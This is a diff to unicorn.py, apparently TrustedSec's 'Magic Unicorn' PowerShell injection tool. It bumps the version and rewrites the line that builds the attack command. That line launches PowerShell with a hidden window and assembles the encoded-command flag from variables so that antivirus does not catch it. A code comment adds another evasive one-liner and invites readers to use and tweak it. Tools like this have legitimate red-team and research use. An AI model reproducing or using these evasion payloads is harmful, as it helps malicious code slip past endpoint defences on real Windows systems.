@@ -495,7 +495,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.8.7 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.8.8 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -1013,7 +1013,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     random_quotes = ["''", '\\"\\"' ]
     mangle_quotes = (random.choice(random_quotes))
 
-    full_attack = '''powershell /w 1 /C "s{0}v {1} -;s{0}v {2} e{0}c;s{0}v {3} ((g{0}v {4}).value.toString()+(g{0}v {5}).value.toString());powershell (g{0}v {6}).value.toString() (\''''.format(mangle_quotes,ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+    full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
 
     # for cobalt strike
